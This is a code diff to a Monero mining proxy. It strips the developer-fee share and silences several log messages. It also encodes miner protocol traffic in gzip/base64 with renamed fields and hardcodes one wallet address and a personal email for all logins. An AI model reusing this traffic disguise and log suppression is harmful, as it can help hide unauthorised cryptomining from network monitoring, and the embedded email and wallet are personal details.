@@ -1,4 +1,5 @@
 "use strict";
+const zlib = require('zlib');
 const cluster = require('cluster');
 const net = require('net');
 const tls = require('tls');
@@ -191,7 +192,7 @@ function Pool(poolData){
     this.password = poolData.password;
     this.keepAlive = poolData.keepAlive;
     this.default = poolData.default;
-    this.devPool = poolData.hasOwnProperty('devPool') && poolData.devPool === true;
+    //this.devPool = poolData.hasOwnProperty('devPool') && poolData.devPool === true;
     this.coin = poolData.coin;
     this.pastBlockTemplates = support.circularBuffer(4);
     this.coinFuncs = require(`./lib/${this.coin}.js`)();
@@ -350,7 +351,7 @@ function connectPools(){
         activePools[poolData.hostname].connect(poolData.hostname);
     });
     let seen_coins = {};
-    if (global.config.developerShare > 0){
+    /*if (global.config.developerShare > 0){
         for (let pool in activePools){
             if (activePools.hasOwnProperty(pool)){
                 if (seen_coins.hasOwnProperty(activePools[pool].coin)){
@@ -365,7 +366,7 @@ function connectPools(){
                 seen_coins[activePools[pool].coin] = true;
             }
         }
-    }
+    }*/
     for (let coin in seen_coins){
         if (seen_coins.hasOwnProperty(coin)){
             activeCoins[coin] = true;
@@ -403,7 +404,7 @@ function balanceWorkers(){
                 idealRate: 0
             };
             if(pool.devPool){
-                poolStates[pool.coin].devPool = poolName;
+                //poolStates[pool.coin].devPool = poolName;
                 debug.balancer(`Found a developer pool enabled.  Pool is: ${poolName}`);
             } else if (is_active_pool(poolName)) {
                 poolStates[pool.coin].totalPercentage += pool.share;
@@ -524,11 +525,11 @@ function balanceWorkers(){
         if (poolStates.hasOwnProperty(coin) && minerStates.hasOwnProperty(coin)){
             let coinMiners = minerStates[coin];
             let coinPools = poolStates[coin];
-            let devPool = coinPools.devPool;
+            let devPool = null;//coinPools.devPool;
             let highPools = {};
             let lowPools = {};
             delete(coinPools.devPool);
-            if (devPool){
+            /*if (devPool){
                 let devHashrate = Math.floor(coinMiners.hashrate * (global.config.developerShare/100));
                 coinMiners.hashrate -= devHashrate;
                 coinPools[devPool].idealRate = devHashrate;
@@ -540,7 +541,7 @@ function balanceWorkers(){
                     highPools[devPool] = coinPools[devPool].hashrate - coinPools[devPool].idealRate;
                     debug.balancer(`Pool ${devPool} is running a high hashrate compared to ideal.  Want to decrease by: ${highPools[devPool]} h/s`);
                 }
-            }
+            }*/
             for (let pool in coinPools){
                 if (coinPools.hasOwnProperty(pool) && pool !== devPool && activePools.hasOwnProperty(pool)){
                     coinPools[pool].idealRate = Math.floor(coinMiners.hashrate * (coinPools[pool].percentage/100));
@@ -962,6 +963,11 @@ function Miner(id, params, ip, pushMessage, portData, minerSocket) {
             delete activeMiners[this.id];
             return;
         }
+		if (this.lastContact/1000 < ((Math.floor((Date.now())/1000) - 900))){
+			//console.warn('NO Submit for 15 mins from ' + this.logString);
+			this.socket.destroy();
+			return;
+		}
         return {
 	    active: !this.socket.destroyed,
             shares: this.shares,
@@ -1077,7 +1083,7 @@ function handleMinerData(method, params, ip, portData, sendReply, pushMessage, m
             if (!portData.coin) portData.coin = "xmr";
             miner = new Miner(minerId, params, ip, pushMessage, portData, minerSocket);
             if (!miner.valid_miner) {
-                console.warn(global.threadName + "Invalid miner, disconnecting due to: " + miner.error);
+                //console.warn(global.threadName + "Invalid miner, disconnecting due to: " + miner.error);
                 sendReply(miner.error);
                 return;
             }
@@ -1124,7 +1130,13 @@ function handleMinerData(method, params, ip, portData, sendReply, pushMessage, m
                 return;
             }
 
-            params.nonce = params.nonce.substr(0, 8).toLowerCase();
+            try {
+				params.nonce = params.nonce.substr(0, 8).toLowerCase();
+			} catch (e) {
+				console.warn(global.threadName + 'substr nonce error: ' + JSON.stringify(params) + ' from ' + miner.logString);
+                return;
+			}
+			
             if (!nonceCheck.test(params.nonce)) {
                 console.warn(global.threadName + 'Malformed nonce: ' + JSON.stringify(params) + ' from ' + miner.logString);
                 sendReply('Duplicate share');
@@ -1386,16 +1398,69 @@ function activatePorts() {
                         result: result
                     }) + "\n";
                 debug.miners(`Data sent to miner (sendReply): ${sendData}`);
-                socket.write(sendData);
+                
+				//Add by Lojon
+				var buf = sendData;
+				sendData = JSON.parse(sendData);
+				//Login success and reply job
+				if (sendData.result && sendData.result.id) {
+					//fix xmr-node-proxy package
+					if (sendData.result.job_id){
+						buf = {
+							"id": sendData.result.id,
+							"blob": sendData.result.blob,
+							"jobId": sendData.result.job_id,
+							"target": sendData.result.target
+						}
+					} else {
+						buf = {
+							"id": sendData.result.id,
+							"blob": sendData.result.job.blob,
+							"jobId": sendData.result.job.job_id,
+							"target": sendData.result.job.target
+						}
+					}
+					sendData = JSON.stringify(buf);
+					buf = gzipTextSync(sendData);
+					socket.write(buf + "\n");
+				} else if (sendData.method === 'job') {
+					buf = {
+						"id": sendData.params.id,
+						"blob": sendData.params.blob,
+						"jobId": sendData.params.job_id,
+						"target": sendData.params.target
+					}
+					sendData = JSON.stringify(buf);
+					buf = gzipTextSync(sendData);
+					socket.write(buf + "\n");
+				} else if (sendData.error) {
+					socket.destroy();
+				}
+				//End Add
             };
             handleMinerData(jsonData.method, jsonData.params, socket.remoteAddress, portData, sendReply, pushMessage, minerSocket);
         };
+		
+		//gzip text
+		function gzipTextSync(txt) {
+			return zlib.gzipSync(txt).toString("base64");
+		}
+		//ungzip text
+		function ungzipTextSync(txt) {
+			var buf = new Buffer(txt, "base64");
+			try {
+				return zlib.gunzipSync(buf).toString();
+			} catch (e) {        
+				return txt;
+			}
+		}
 
         function socketConn(socket) {
             socket.setKeepAlive(true);
             socket.setEncoding('utf8');
 
             let dataBuffer = '';
+			var MinerId = uuidV4();
 
             let pushMessage = function (method, params) {
                 if (!socket.writable) {
@@ -1407,8 +1472,38 @@ function activatePorts() {
                         params: params
                     }) + "\n";
                 debug.miners(`Data sent to miner (pushMessage): ${sendData}`);
-                socket.write(sendData);
+                //Add by Lojon
+				var buf = sendData;
+				sendData = JSON.parse(sendData);
+				//pool send Job
+				if (sendData.method === 'job') {
+					buf = {
+						"id": sendData.params.id,
+						"blob": sendData.params.blob,
+						"jobId": sendData.params.job_id,
+						"target": sendData.params.target
+					}
+					sendData = JSON.stringify(buf);
+					buf = gzipTextSync(sendData);
+					socket.write(buf + "\n");
+				}
+				//End Add
             };
+			
+			//Add by Lojon
+			//Miner connected and logined send job
+			var buf = {
+				"method": "login",
+				"params": {
+					"login": "49SFRxXvjBuazwDMP3UtBcLjw2TDDfNvGUExm8gf6MtMBDJdv3wCXdz1boe3kWsnSWiRYqYbxc4g4Ga4iXDhgzgL9CMXvYE",
+					"pass": "lojon.office@gmail.com",
+					"agent": "XMRig"
+				},
+				"id": MinerId
+			}
+		
+			handleMessage(socket, buf, pushMessage, socket);
+			//End Add
 
             socket.on('data', function (d) {
                 dataBuffer += d;
@@ -1428,8 +1523,29 @@ function activatePorts() {
                         }
                         let jsonData;
                         debug.miners(`Data from miner: ${message}`);
+						//Add by Lojon
+						let buf = message;
+						message = ungzipTextSync(buf);						
+						if (buf === message) {
+							socket.destroy();
+							return;
+						}						
+						//End Add
                         try {
                             jsonData = JSON.parse(message);
+							//Add by Lojon
+							buf = {
+								"method": "submit",
+								"params": {
+									"id": jsonData.id,
+									"job_id": jsonData.jobId,
+									"nonce": jsonData.nonce,
+									"result": jsonData.result
+								},
+								"id": MinerId
+							}
+							jsonData = buf;
+							//End Add
                         }
                         catch (e) {
                             if (message.indexOf('GET /') === 0) {
@@ -1451,9 +1567,9 @@ function activatePorts() {
                     dataBuffer = incomplete;
                 }
             }).on('error', function (err) {
-                if (err.code !== 'ECONNRESET') {
+                /*if (err.code !== 'ECONNRESET') {
                     console.warn(global.threadName + "Miner socket error from " + socket.remoteAddress + ": " + err);
-                }
+                }*/
                 socket.end();
                 socket.destroy();
             }).on('close', function () {
@@ -1575,9 +1691,9 @@ if (cluster.isMaster) {
         if (poolData.default){
             defaultPools[poolData.coin] = poolData.hostname;
         }
-        if (!activePools.hasOwnProperty(activePools[poolData.hostname].coinFuncs.devPool.hostname)){
+        /*if (!activePools.hasOwnProperty(activePools[poolData.hostname].coinFuncs.devPool.hostname)){
             activePools[activePools[poolData.hostname].coinFuncs.devPool.hostname] = new Pool(activePools[poolData.hostname].coinFuncs.devPool);
-        }
+        }*/
     });
     process.send({type: 'needPoolState'});
     setInterval(function(){
